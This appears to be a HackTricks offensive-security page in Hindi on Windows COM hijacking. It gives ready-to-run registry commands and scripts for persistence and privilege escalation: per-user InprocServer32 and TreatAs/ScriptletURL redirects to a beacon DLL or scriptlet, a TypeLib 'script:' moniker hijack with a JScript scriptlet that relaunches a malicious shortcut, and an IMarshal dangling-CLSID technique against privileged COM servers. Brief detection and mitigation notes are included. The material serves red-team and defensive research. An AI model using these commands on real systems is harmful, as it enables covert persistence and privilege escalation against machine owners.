# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### ऐसे COM components खोजना जो मौजूद नहीं हैं

HKCU के मान users द्वारा बदले जा सकते हैं, इसलिए **COM Hijacking** का इस्तेमाल **persistence mechanism** के रूप में किया जा सकता है। `procmon` का इस्तेमाल करके ऐसे COM registries खोजना आसान है जिन्हें अभी तक बनाया नहीं गया है और जिन्हें attacker बना सकता है। सामान्य filters:

- **RegOpenKey** operations।
- जहाँ _Result_ **NAME NOT FOUND** हो।
- और _Path_ का अंत **InprocServer32** से होता हो।

खोज करते समय उपयोगी विकल्प:

- अनुपस्थित **`LocalServer32`** keys भी खोजें। कुछ COM classes out-of-process servers होते हैं और DLL के बजाय attacker-नियंत्रित EXE launch करेंगे।
- `InprocServer32` के अलावा **`TreatAs`** और **`ScriptletURL`** registry operations भी खोजें। हाल के detection content और malware writeups में इनका बार-बार ज़िक्र होता है, क्योंकि ये सामान्य COM registrations की तुलना में बहुत कम मिलते हैं और इसलिए इनका signal अधिक होता है।
- HKCU में registration की नकल करते समय, मूल `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` से वैध **`ThreadingModel`** कॉपी करें। गलत model का इस्तेमाल अक्सर activation को बिगाड़ता है और hijack को आसानी से पकड़ में आने लायक बना देता है।<sup>[[3]](#references)</sup>
- 64-bit systems पर 64-bit और 32-bit, दोनों views जाँचें (`procmon.exe` बनाम `procmon64.exe`, `HKLM\Software\Classes` और `HKLM\Software\Classes\WOW6432Node`), क्योंकि 32-bit applications अलग COM registration resolve कर सकते हैं।

यह तय करने के बाद कि किस ऐसे COM की नकल करनी है जो मौजूद नहीं है, नीचे दिए गए commands चलाएँ। _अगर आप ऐसे COM की नकल करने का फ़ैसला करते हैं जो हर कुछ सेकंड में load होता है, तो सावधान रहें—यह ज़रूरत से ज़्यादा हो सकता है।_

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Hijackable Task Scheduler COM components

Windows Tasks, COM objects को कॉल करने के लिए Custom Triggers का इस्तेमाल करते हैं और क्योंकि ये Task Scheduler के ज़रिए execute होते हैं, इसलिए इनके trigger होने का समय अनुमानित करना आसान होता है।

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

आउटपुट देखकर आप ऐसा component चुन सकते हैं जो उदाहरण के लिए **हर बार किसी user के login करने पर** execute होगा।

अब **HKEY\CLASSES\ROOT\CLSID** और HKLM तथा HKCU में CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** खोजने पर, आम तौर पर आपको पता चलेगा कि HKCU में यह value मौजूद नहीं है।

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

फिर, आप बस HKCU entry बना सकते हैं और हर बार user के login करने पर आपका backdoor चलाया जाएगा।

## Dangling COM Registrations और Custom Marshaling

मशीन-व्यापी COM registration, registry में बदलाव किए बिना DLL-planting primitive बन सकता है। ऐसे `InprocServer32` value की तलाश करें जिसकी DLL मौजूद न हो और जिसका अंतिम path किसी low-privileged user द्वारा बनाया या संशोधित किया जा सके। ठीक उसी DLL name को plant करने से CLSID को activate करने वाला कोई भी process attacker code load करेगा। CrossDevice उदाहरण में, registered path `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll` था, इसलिए एक standard user missing child directory और DLL बना सकता था।<sup>[[5]](#references)</sup>

### Cross-process DLL-load primitive के रूप में `IMarshal`

COM आम तौर पर interface pointer को एक standard `OBJREF` के रूप में दर्शाता है, जो receiver को मूल object से जोड़ता है। `IMarshal` implement करने वाला object इसके बजाय एक custom `OBJREF` बना सकता है। इसका `GetUnmarshalClass` method उस code का CLSID देता है जो receiving process में object को फिर से बनाएगा। उस CLSID को मूल object की पहचान बताना आवश्यक नहीं है। COM इसे in-process server के रूप में resolve करता है और अनुरोधित interface method को dispatch करने से पहले registered DLL load करता है।<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

एक न्यूनतम malicious implementation को केवल `GetUnmarshalClass` में dangling CLSID बदलने की ज़रूरत होती है।<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

इस object को किसी proxied method parameter के ज़रिए भेजें, जैसे `[in] IUnknown *`। एक और विकल्प `CoGetInstanceFromIStorage` है, जिसमें custom-marshaled object को स्थानीय जाँचों में पास होने के लिए पर्याप्त `IStorage` भी implement करना होगा। Remote server में automatic unmarshaling से substituted CLSID resolve होता है, इसलिए target method चलने से पहले DLL load हो जाती है।<sup>[[5]](#references)</sup>

यह primitive केवल missing registrations तक सीमित नहीं है। इससे receiver को मौजूदा custom-unmarshaler DLL load करने के लिए भी मजबूर किया जा सकता है और उसके load या unmarshaling path में bugs उजागर किए जा सकते हैं।<sup>[[5]](#references)</sup>

इस chain के लिए ये सभी शर्तें ज़रूरी हैं:<sup>[[5]](#references)</sup>

1. Machine-visible CLSID किसी missing या replaceable in-process DLL की ओर इंगित करता हो।
2. Attacker उस DLL को resolved path पर रख सकता हो।
3. Activatable out-of-process COM server वांछित privilege level पर चलता हो।
4. Server custom marshaling स्वीकार करता हो और ऐसी proxied call उपलब्ध कराता हो जो attacker object को process boundary के पार ले जाए।

### Dangling in-process servers खोजें

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) और [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) machine COM database को enumerate कर सकते हैं और हर server को normal Win32 module resolution के ज़रिए जाँच सकते हैं। यह `Test-Path` से बेहतर है, क्योंकि कुछ registrations में केवल filename होता है और वे loader search path पर निर्भर होते हैं।<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

परिणाम को संभावित उम्मीदवारों की सूची मानें, exploitability का प्रमाण नहीं। Path को वैसे resolve करें जैसे loader करता है, फिर पहले से मौजूद parent और intended DLL (यदि वह पहले से मौजूद है) पर DACL जाँचें। Missing file तभी उपयोगी है, जब attacker उस path को बना या बदल सके जिसे COM वास्तव में resolve करेगा।<sup>[[5]](#references)</sup>

### Privileged receiver चुनें और शुरू करें

संभावित COM classes में `RunAs`, service association, उपलब्ध interfaces और RPC proxies की जाँच करें। `SYSTEM` के लिए configured class, जिसका समर्थन किसी named service से न हो, direct activation में विफल हो सकती है, क्योंकि RPCSS उसे शुरू नहीं कर सकता। ऐसी स्थिति में, ऐसा unprivileged trigger ढूँढ़ें जो उसके host को शुरू करता हो—जैसे executable scheduled task—और server को चालू रखने के लिए आवश्यक किसी named-event या IPC prerequisite को दोहराएँ।<sup>[[5]](#references)</sup>

उदाहरण के लिए, vulnerable Shell Create Object Handler chain ने user-executable scheduled task शुरू करने से पहले अपेक्षित global event बनाया था।<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

परिणामी object reference को उसके host से वापस जोड़ें और identity तथा marshaling policy, दोनों की पुष्टि करें। फिर interfaces की गणना करें और उनके proxies को IDL में बदलकर `IUnknown *` जैसा input parameter खोजें, जो fake object को marshal करेगा।<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Custom-marshaling protections

एक उपयुक्त receiver को untrusted custom marshalers को अस्वीकार करना चाहिए। पूरी process पर लागू होने वाली दो protections हैं: `CoInitializeSecurity` को दिए गए capabilities में `EOAC_NO_CUSTOM_MARSHAL` और `IGlobalOptions::Set` के ज़रिए सेट किया गया `COMGLB_UNMARSHALING_POLICY_STRONG`। Symbols के साथ, संबंधित state को `combase!gCapabilities` और `combase!g_GLBOPT_UnmarshalingPolicy` में inspect किया जा सकता है; जहाँ इसका process parser संबंधित Windows build को support करता है, वहाँ NtObjectManager नतीजे को `CustomMarshalAllowed` के रूप में दिखाता है।<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` एक CLSID को दूसरे CLSID की तरह emulate करने देता है।<sup>[[4]](#references)</sup> Offensive नज़रिए से इसका मतलब है कि आप मूल CLSID को जस का तस छोड़ सकते हैं, एक दूसरा per-user CLSID बना सकते हैं जो `scrobj.dll` की ओर point करे, और फिर `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` से असली COM object को malicious object की ओर redirect कर सकते हैं।

यह तब उपयोगी है जब:

- target application पहले से ही logon पर या app शुरू होने पर किसी स्थिर CLSID को instantiate करता हो
- आप मूल `InprocServer32` को replace करने के बजाय केवल registry के ज़रिए redirect करना चाहते हों
- आप `ScriptletURL` value के ज़रिए कोई local या remote `.sct` scriptlet execute करना चाहते हों

उदाहरण workflow (सार्वजनिक Atomic Red Team tradecraft और COM registry के दुरुपयोग पर पुराने शोध से अनुकूलित):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Notes:

- `scrobj.dll` `ScriptletURL` value को पढ़ता है और संदर्भित `.sct` को execute करता है, इसलिए आप payload को local file के रूप में रख सकते हैं या HTTP/HTTPS पर remotely fetch कर सकते हैं।
- `TreatAs` तब विशेष रूप से उपयोगी होता है जब original COM registration HKLM में complete और stable हो, क्योंकि आपको पूरी tree को mirror करने के बजाय केवल एक छोटा per-user redirect चाहिए।
- Natural trigger का इंतज़ार किए बिना validation के लिए, यदि target class STA activation का समर्थन करती है, तो आप `rundll32.exe -sta <ProgID-or-CLSID>` से fake ProgID/CLSID को manually instantiate कर सकते हैं।

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) COM interfaces को define करती हैं और `LoadTypeLib()` के ज़रिए load होती हैं। जब कोई COM server instantiate होता है, तो OS `HKCR\TypeLib\{LIBID}` के अंतर्गत registry keys देखकर संबंधित TypeLib भी load कर सकता है। यदि TypeLib path को किसी **moniker** से replace कर दिया जाए, जैसे `script:C:\...\evil.sct`, तो TypeLib resolve होने पर Windows scriptlet execute करेगा—जिससे ऐसी stealthy persistence मिलती है जो common components के उपयोग पर trigger होती है।

यह Microsoft Web Browser control के विरुद्ध देखा गया है (जिसे अक्सर Internet Explorer, WebBrowser embed करने वाले apps और यहां तक कि `explorer.exe` भी load करते हैं)।<sup>[[1]](#references)[[2]](#references)</sup>

### Steps (PowerShell)

1) High-frequency CLSID द्वारा उपयोग किए जाने वाले TypeLib (LIBID) की पहचान करें। Malware chains द्वारा अक्सर दुरुपयोग किया जाने वाला CLSID का उदाहरण: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser)।

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) प्रति-उपयोगकर्ता TypeLib पथ को `script:` moniker का उपयोग करके किसी स्थानीय scriptlet पर सेट करें (इसके लिए admin अधिकारों की आवश्यकता नहीं है):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) एक न्यूनतम JScript `.sct` रखें, जो आपके primary payload को फिर से लॉन्च करे (जैसे, initial chain में इस्तेमाल की गई `.lnk`):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) सक्रिय करना – IE खोलने, WebBrowser control को एम्बेड करने वाला कोई application चलाने, या यहाँ तक कि Explorer की सामान्य गतिविधि से TypeLib लोड होगी और scriptlet execute होगा, जिससे logon/reboot पर आपकी chain फिर से सक्रिय हो जाएगी।

सफ़ाई
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

नोट्स
- आप यही logic अन्य high-frequency COM components पर भी लागू कर सकते हैं; हमेशा पहले `HKCR\CLSID\{CLSID}\TypeLib` से वास्तविक `LIBID` resolve करें।
- 64-bit systems पर आप 64-bit consumers के लिए `win64` subkey भी populate कर सकते हैं।

## References

- [1] [TypeLib को Hijack करें – नई COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine अभियान: अमेरिकी कंपनियों को निशाना बनाने वाला एक परिष्कृत Phishing Attack](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [COM Hijacking पर फिर से विचार (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Windows Exploitation Techniques: Dangling COM Object Registrations](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - IMarshal interface](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications - MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
{{#include ../../banners/hacktricks-training.md}}

